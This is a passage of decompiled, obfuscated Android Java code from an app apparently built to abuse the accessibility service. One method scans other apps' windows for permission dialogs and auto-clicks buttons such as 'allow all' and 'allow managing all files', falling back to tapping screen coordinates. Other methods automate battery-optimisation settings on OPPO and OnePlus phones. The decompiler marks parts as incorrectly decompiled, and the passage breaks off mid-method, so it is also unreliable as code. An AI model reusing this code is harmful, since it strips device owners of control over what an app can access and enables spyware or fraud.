                String str2 = "❌ 读取应用列表设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        }
        zM212336d9 = c0368a5.m212336d9("applist");
        return Boolean.valueOf(zM212336d9);
    }

    /* JADX WARN: Removed duplicated region for block: B:112:0x029f A[Catch: Exception -> 0x02ae, TryCatch #0 {Exception -> 0x02ae, blocks: (B:110:0x0299, B:112:0x029f, B:114:0x02a5, B:121:0x02b2, B:122:0x02c9), top: B:129:0x0299 }] */
    /* JADX WARN: Removed duplicated region for block: B:143:0x02cf A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:146:0x01ef A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:160:? A[RETURN, SYNTHETIC] */
    /* renamed from: d1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212333d1() throws InterruptedException {
        boolean z;
        boolean z2;
        dqtvuisjd dqtvuisjdVar;
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        String string2;
        Iterator it;
        String string3;
        boolean z3;
        int iWidth;
        int iHeight;
        int i;
        int iM213513b8;
        int i2;
        String str = "";
        boolean z4 = true;
        int i3 = this.f55131c0 + 1;
        this.f55131c0 = i3;
        boolean z5 = false;
        boolean z6 = i3 <= 3;
        String[] strArr = {"确定", "全部允许", "始终允许", "允许使用照片和视频", "所有文件", "允许管理所有文件", "允许访问全部", "使用期间允许", "仅使用期间允许", "使用应用时允许", "使用时允许", "仅在使用中允许", "仅在前台使用应用时允许", "仅在使用该应用时允许", "允许本次使用", "本次使用时允许", "仅媒体", "允许"};
        dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
        if (c0290a0 == null) {
            if (!z6) {
                return false;
            }
            m212303e0("[混合策略] ❌ 服务实例为空");
            return false;
        }
        try {
            List<AccessibilityWindowInfo> windows = c0290a0.getWindows();
            if (windows != null && !windows.isEmpty()) {
                if (z6) {
                    m212303e0("[混合策略] 获取到 " + windows.size() + " 个窗口");
                }
                Iterator it2 = AbstractC0715je.m213300i7(windows, new C1214s9(9)).iterator();
                while (it2.hasNext()) {
                    AccessibilityWindowInfo accessibilityWindowInfo = (AccessibilityWindowInfo) it2.next();
                    CharSequence title = accessibilityWindowInfo.getTitle();
                    if (title == null || (string2 = title.toString()) == null) {
                        string2 = "(无标题)";
                    }
                    int type = accessibilityWindowInfo.getType();
                    if (string2.equals("导航栏") || string2.equals("状态栏")) {
                        it = it2;
                        z = z4;
                        z2 = z5;
                        dqtvuisjdVar = c0290a0;
                        if (z6) {
                            m212303e0("[混合策略] 跳过: '" + string2 + "'");
                        }
                    } else {
                        boolean z7 = (AbstractC0779a1.m213652a5(string2, "允许", z5) || AbstractC0779a1.m213652a5(string2, "访问", z5) || AbstractC0779a1.m213652a5(string2, "权限", z5)) ? z4 : z5;
                        AccessibilityNodeInfo root = accessibilityWindowInfo.getRoot();
                        if (root != null) {
                            it = it2;
                            z = z4;
                            z2 = z5;
                            dqtvuisjdVar = c0290a0;
                            CharSequence packageName = root.getPackageName();
                            if (packageName == null || (string3 = packageName.toString()) == null) {
                                string3 = "";
                            }
                            if (!string3.equals(this.f55112a1.getPackageName())) {
                                if (z6) {
                                    m212303e0("[混合策略] ★ 搜索窗口: '" + string2 + "', pkg='" + string3 + "', type=" + type);
                                }
                                if (m212298d2(root, strArr, z6)) {
                                    return z;
                                }
                            } else if (z6) {
                                m212303e0("[混合策略] 跳过: '" + string2 + "' (自己的应用)");
                            }
                        } else if (z7) {
                            if (z6) {
                                m212303e0("[混合策略] ⚠️ 权限弹窗'" + string2 + "' root为空，使用坐标点击!");
                            }
                            Rect rect = new Rect();
                            accessibilityWindowInfo.getBoundsInScreen(rect);
                            if (m212306a1(rect, string2, z6)) {
                                return z4;
                            }
                            it = it2;
                            z = z4;
                            z2 = z5;
                            dqtvuisjdVar = c0290a0;
                        } else if (string2.equals("弹出式窗口")) {
                            if (z6) {
                                m212303e0("[混合策略] ⚠️ 检测到权限选择弹窗'弹出式窗口'，使用坐标点击!");
                            }
                            Rect rect2 = new Rect();
                            accessibilityWindowInfo.getBoundsInScreen(rect2);
                            try {
                                iWidth = rect2.width();
                                iHeight = rect2.height();
                                if (z6) {
                                    m212303e0("[选择弹窗] X=20%-80%, Y=25%-45%");
                                }
                                i = 20;
                                iM213513b8 = kg1.m213513b8(20, 80, 15);
                            } catch (Exception unused) {
                                it = it2;
                                z = z4;
                                z2 = z5;
                            }
                            if (20 <= iM213513b8) {
                                z3 = z5;
                                while (true) {
                                    z = z4;
                                    z2 = z5;
                                    int i4 = 25;
                                    try {
                                        int iM213513b82 = kg1.m213513b8(25, 45, 5);
                                        if (25 <= iM213513b82) {
                                            while (true) {
                                                it = it2;
                                                dqtvuisjdVar = c0290a0;
                                                i2 = iWidth;
                                                try {
                                                    if (m212309a4(rect2.left + ((int) ((iWidth * i) / 100.0d)), rect2.top + ((int) ((iHeight * i4) / 100.0d)))) {
                                                        z3 = z;
                                                    }
                                                    Thread.sleep(3L);
                                                    if (i4 == iM213513b82) {
                                                        break;
                                                    }
                                                    i4 += 5;
                                                    it2 = it;
                                                    c0290a0 = dqtvuisjdVar;
                                                    iWidth = i2;
                                                } catch (Exception unused2) {
                                                }
                                            }
                                        } else {
                                            it = it2;
                                            dqtvuisjdVar = c0290a0;
                                            i2 = iWidth;
                                        }
                                        if (i == iM213513b8) {
                                            break;
                                        }
                                        i += 15;
                                        z4 = z;
                                        z5 = z2;
                                        it2 = it;
                                        c0290a0 = dqtvuisjdVar;
                                        iWidth = i2;
                                    } catch (Exception unused3) {
                                        it = it2;
                                    }
                                }
                                if (!z3) {
                                    return z;
                                }
                            } else {
                                it = it2;
                                z = z4;
                                z2 = z5;
                            }
                            dqtvuisjdVar = c0290a0;
                            z3 = z2;
                            if (!z3) {
                            }
                        } else {
                            it = it2;
                            z = z4;
                            z2 = z5;
                            dqtvuisjdVar = c0290a0;
                            if (z6) {
                                try {
                                    m212303e0("[混合策略] 跳过: '" + string2 + "' (root为空)");
                                } catch (Exception e) {
                                    e = e;
                                    if (z6) {
                                        m212303e0("[混合策略] windows遍历异常: " + e.getMessage());
                                    }
                                    rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                                    if (rootInActiveWindow != null) {
                                    }
                                }
                            } else {
                                continue;
                            }
                        }
                    }
                    z4 = z;
                    z5 = z2;
                    it2 = it;
                    c0290a0 = dqtvuisjdVar;
                }
            }
            z = z4;
            z2 = z5;
            dqtvuisjdVar = c0290a0;
        } catch (Exception e2) {
            e = e2;
            z = z4;
            z2 = z5;
            dqtvuisjdVar = c0290a0;
        }
        try {
            rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                return z2;
            }
            CharSequence packageName2 = rootInActiveWindow.getPackageName();
            if (packageName2 != null && (string = packageName2.toString()) != null) {
                str = string;
            }
            if (z6) {
                m212303e0("[混合策略] rootInActiveWindow: pkg='" + str + "'");
            }
            return m212298d2(rootInActiveWindow, strArr, z6) ? z : z2;
        } catch (Exception e3) {
            if (!z6) {
                return z2;
            }
            m212303e0("[混合策略] rootInActiveWindow异常: " + e3.getMessage());
            return z2;
        }
    }

    /* renamed from: d7 */
    public final String m212334d7() {
        return (String) this.f55127b6.getValue();
    }

    /* renamed from: d8 */
    public final AccessibilityNodeInfo m212335d8() {
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            AccessibilityService accessibilityService = this.f55111a0;
            dqtvuisjd dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
            if (dqtvuisjdVar != null && (rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow()) != null) {
                return rootInActiveWindow;
            }
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 != null) {
                return c0290a0.getRootInActiveWindow();
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: d9 */
    public final boolean m212336d9(String str) {
        return ((SharedPreferences) this.f55128b7.getValue()).getBoolean(str, false);
    }

    /* JADX WARN: Code restructure failed: missing block: B:24:0x0083, code lost:
    
        if (m212339e3(r1) == r2) goto L32;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x0086, code lost:
    
        r1 = r10;
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0090, code lost:
    
        if (m212338e2(r1) == r2) goto L32;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x009b, code lost:
    
        if (m212340e4(r1) == r2) goto L32;
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x009d, code lost:
    
        return r2;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: e1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212337e1(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$m$1 oppoStepsSimplified$m$1;
        C0368a5 c0368a5;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$m$1) {
            oppoStepsSimplified$m$1 = (OppoStepsSimplified$m$1) continuationImpl;
            int i = oppoStepsSimplified$m$1.f54605a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$m$1.f54605a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$m$1 = new OppoStepsSimplified$m$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$m$1.f54603a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$m$1.f54605a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (m212336d9("battery")) {
                m212303e0("⏭️ m()电池已完成");
                return c1351vv;
            }
            y90 y90Var = this.f55120a9;
            m212303e0("[m()] pswitch_3 SDK=" + this.f55113a2 + ", Brand=" + ((OppoStepsSimplified$SubBrand) y90Var.getValue()));
            int iOrdinal = ((OppoStepsSimplified$SubBrand) y90Var.getValue()).ordinal();
            if (iOrdinal == 1) {
                oppoStepsSimplified$m$1.f54602a0 = this;
                oppoStepsSimplified$m$1.f54605a3 = 2;
            } else if (iOrdinal != 2) {
                oppoStepsSimplified$m$1.f54602a0 = this;
                oppoStepsSimplified$m$1.f54605a3 = 3;
            } else {
                oppoStepsSimplified$m$1.f54602a0 = this;
                oppoStepsSimplified$m$1.f54605a3 = 1;
            }
        } else {
            if (i2 != 1 && i2 != 2 && i2 != 3) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$m$1.f54602a0;
            kg1.m213544f4(obj);
        }
        c0368a5.m212341e5("battery");
        m212303e0("✅ m()电池完成");
        return c1351vv;
    }

    /* JADX WARN: Code restructure failed: missing block: B:147:0x0329, code lost:
    
        if (r5.m212354f9(300, r3) != r4) goto L149;
     */
    /* JADX WARN: Code restructure failed: missing block: B:162:0x0372, code lost:
    
        if (r6 == r4) goto L207;
     */
    /* JADX WARN: Removed duplicated region for block: B:102:0x0241 A[PHI: r5
      0x0241: PHI (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v23 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v26 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:100:0x023d, B:38:0x0101] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:105:0x024f A[PHI: r5
      0x024f: PHI (r5v27 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v28 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:103:0x024b, B:37:0x00fa] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:107:0x0255  */
    /* JADX WARN: Removed duplicated region for block: B:112:0x026e  */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0281  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x02af A[PHI: r1 r5
      0x02af: PHI (r1v43 java.lang.String) = (r1v41 java.lang.String), (r1v41 java.lang.String), (r1v41 java.lang.String), (r1v44 java.lang.String) binds: [B:121:0x02ab, B:118:0x0298, B:113:0x027d, B:35:0x00ea] A[DONT_GENERATE, DONT_INLINE]
      0x02af: PHI (r5v31 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v32 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:121:0x02ab, B:118:0x0298, B:113:0x027d, B:35:0x00ea] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:126:0x02bd A[PHI: r1 r5
      0x02bd: PHI (r1v45 java.lang.String) = (r1v43 java.lang.String), (r1v46 java.lang.String) binds: [B:124:0x02b9, B:34:0x00e2] A[DONT_GENERATE, DONT_INLINE]
      0x02bd: PHI (r5v33 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v31 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v34 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:124:0x02b9, B:34:0x00e2] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:130:0x02cc A[PHI: r1 r5
      0x02cc: PHI (r1v47 java.lang.String) = (r1v45 java.lang.String), (r1v48 java.lang.String) binds: [B:127:0x02c7, B:129:0x02cb] A[DONT_GENERATE, DONT_INLINE]
      0x02cc: PHI (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v33 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v36 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:127:0x02c7, B:129:0x02cb] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02d4  */
    /* JADX WARN: Removed duplicated region for block: B:138:0x02f4 A[PHI: r1 r5
      0x02f4: PHI (r1v51 java.lang.String) = (r1v49 java.lang.String), (r1v52 java.lang.String) binds: [B:136:0x02f0, B:31:0x00cb] A[DONT_GENERATE, DONT_INLINE]
      0x02f4: PHI (r5v40 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v38 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v41 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:136:0x02f0, B:31:0x00cb] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:141:0x0308 A[PHI: r1 r5 r6 r7
      0x0308: PHI (r1v53 java.lang.String) = (r1v51 java.lang.String), (r1v54 java.lang.String) binds: [B:139:0x0304, B:30:0x00c0] A[DONT_GENERATE, DONT_INLINE]
      0x0308: PHI (r5v42 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v40 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v43 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:139:0x0304, B:30:0x00c0] A[DONT_GENERATE, DONT_INLINE]
      0x0308: PHI (r6v31 java.lang.Object) = (r6v30 java.lang.Object), (r6v35 java.lang.Object) binds: [B:139:0x0304, B:30:0x00c0] A[DONT_GENERATE, DONT_INLINE]
      0x0308: PHI (r7v3 int) = (r7v2 int), (r7v4 int) binds: [B:139:0x0304, B:30:0x00c0] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:143:0x0310  */
    /* JADX WARN: Removed duplicated region for block: B:150:0x0335 A[PHI: r1 r5
      0x0335: PHI (r1v57 java.lang.String) = (r1v53 java.lang.String), (r1v58 java.lang.String) binds: [B:142:0x030e, B:149:0x032d] A[DONT_GENERATE, DONT_INLINE]
      0x0335: PHI (r5v46 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v42 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v47 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:142:0x030e, B:149:0x032d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:153:0x0343 A[PHI: r1 r5
      0x0343: PHI (r1v60 java.lang.String) = (r1v57 java.lang.String), (r1v61 java.lang.String) binds: [B:151:0x033f, B:27:0x00a8] A[DONT_GENERATE, DONT_INLINE]
      0x0343: PHI (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v46 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v50 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:151:0x033f, B:27:0x00a8] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0351  */
    /* JADX WARN: Removed duplicated region for block: B:157:0x0356 A[PHI: r1 r5
      0x0356: PHI (r1v62 java.lang.String) = (r1v47 java.lang.String), (r1v60 java.lang.String), (r1v63 java.lang.String) binds: [B:156:0x0351, B:154:0x034d, B:26:0x00a0] A[DONT_GENERATE, DONT_INLINE]
      0x0356: PHI (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v52 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:156:0x0351, B:154:0x034d, B:26:0x00a0] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x035e  */
    /* JADX WARN: Removed duplicated region for block: B:167:0x037f A[PHI: r5
      0x037f: PHI (r5v76 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v54 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v74 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v77 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:165:0x037c, B:203:0x0430, B:14:0x0043] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:168:0x0382 A[PHI: r1 r5
      0x0382: PHI (r1v64 java.lang.String) = (r1v62 java.lang.String), (r1v62 java.lang.String), (r1v65 java.lang.String) binds: [B:158:0x035c, B:160:0x0364, B:165:0x037c] A[DONT_GENERATE, DONT_INLINE]
      0x0382: PHI (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v54 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:158:0x035c, B:160:0x0364, B:165:0x037c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:171:0x0390 A[PHI: r1 r5
      0x0390: PHI (r1v67 java.lang.String) = (r1v64 java.lang.String), (r1v68 java.lang.String) binds: [B:169:0x038c, B:24:0x008f] A[DONT_GENERATE, DONT_INLINE]
      0x0390: PHI (r5v56 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v57 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:169:0x038c, B:24:0x008f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:174:0x03a3 A[PHI: r1 r5
      0x03a3: PHI (r1v69 java.lang.String) = (r1v67 java.lang.String), (r1v70 java.lang.String) binds: [B:172:0x039f, B:23:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x03a3: PHI (r5v58 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v56 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v59 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:172:0x039f, B:23:0x0087] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:176:0x03ab  */
    /* JADX WARN: Removed duplicated region for block: B:182:0x03c9 A[PHI: r1 r5
      0x03c9: PHI (r1v73 java.lang.String) = (r1v71 java.lang.String), (r1v74 java.lang.String) binds: [B:180:0x03c5, B:21:0x0077] A[DONT_GENERATE, DONT_INLINE]
      0x03c9: PHI (r5v62 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v60 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v63 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:180:0x03c5, B:21:0x0077] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:185:0x03dc A[PHI: r1 r5 r6
      0x03dc: PHI (r1v75 java.lang.String) = (r1v73 java.lang.String), (r1v76 java.lang.String) binds: [B:183:0x03d9, B:20:0x006e] A[DONT_GENERATE, DONT_INLINE]
      0x03dc: PHI (r5v64 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v62 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v65 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:183:0x03d9, B:20:0x006e] A[DONT_GENERATE, DONT_INLINE]
      0x03dc: PHI (r6v68 java.lang.Object) = (r6v67 java.lang.Object), (r6v73 java.lang.Object) binds: [B:183:0x03d9, B:20:0x006e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:187:0x03e4  */
    /* JADX WARN: Removed duplicated region for block: B:193:0x03ff A[PHI: r5
      0x03ff: PHI (r5v68 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v64 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v66 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v69 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:186:0x03e2, B:191:0x03fc, B:18:0x005f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:196:0x040c A[PHI: r5
      0x040c: PHI (r5v70 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v68 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v71 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:194:0x0409, B:17:0x0058] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:199:0x0419 A[PHI: r5
      0x0419: PHI (r5v72 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v58 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v70 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v73 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:175:0x03a9, B:197:0x0416, B:16:0x0051] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:202:0x0426 A[PHI: r5
      0x0426: PHI (r5v74 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v72 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v75 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:200:0x0423, B:15:0x004a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:207:0x043f A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:208:0x0440 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0118 A[PHI: r5
      0x0118: PHI (r5v21 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v19 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v22 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:90:0x0212, B:42:0x0113] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:68:0x0195 A[PHI: r5
      0x0195: PHI (r5v5 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v3 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v6 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:66:0x0191, B:51:0x014d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01a2 A[PHI: r5
      0x01a2: PHI (r5v7 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v5 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v8 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:69:0x019e, B:50:0x0147] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x01b3 A[PHI: r5
      0x01b3: PHI (r5v9 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v7 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v10 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:72:0x01af, B:49:0x0140] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x01c5 A[PHI: r5
      0x01c5: PHI (r5v11 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v9 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v12 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:75:0x01c1, B:48:0x0139] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x01d4 A[PHI: r5
      0x01d4: PHI (r5v13 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v11 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v14 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:78:0x01d0, B:47:0x0132] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:83:0x01e2 A[PHI: r5
      0x01e2: PHI (r5v15 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v13 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v16 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:81:0x01de, B:46:0x012b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:86:0x01f7 A[PHI: r5 r6
      0x01f7: PHI (r5v17 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v15 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v18 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:84:0x01f3, B:45:0x0122] A[DONT_GENERATE, DONT_INLINE]
      0x01f7: PHI (r6v2 long) = (r6v1 long), (r6v3 long) binds: [B:84:0x01f3, B:45:0x0122] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x0208 A[PHI: r5
      0x0208: PHI (r5v19 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v17 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v20 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:87:0x0204, B:44:0x011b] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: e2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212338e2(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$mOnePlus$1 oppoStepsSimplified$mOnePlus$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        long j;
        String str;
        int i;
        Object objM212314a9;
        Object objM212314a92;
        Object objM212314a93;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$mOnePlus$1) {
            oppoStepsSimplified$mOnePlus$1 = (OppoStepsSimplified$mOnePlus$1) continuationImpl;
            int i2 = oppoStepsSimplified$mOnePlus$1.f54609a3;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$mOnePlus$1.f54609a3 = i2 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$mOnePlus$1 = new OppoStepsSimplified$mOnePlus$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$mOnePlus$1.f54607a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (oppoStepsSimplified$mOnePlus$1.f54609a3) {
            case 0:
                kg1.m213544f4(obj);
                m212303e0("[mOnePlus] case 1");
                int i3 = this.f55113a2;
                if (i3 >= 36) {
                    m212303e0("[mOnePlus] Android 16+，走OPPO流程");
                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 1;
                    if (m212339e3(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                        return c1351vv;
                    }
                } else if (i3 > 34) {
                    oppoStepsSimplified$mOnePlus$1.f54606a0 = this;
                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 2;
                    if (m212344e8(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                        c0368a52 = this;
                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 3;
                        if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 4;
                            if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                c0368a52.m212313a8("电池模式");
                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 5;
                                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                    c0368a52.m212313a8("均衡模式");
                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 6;
                                    if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
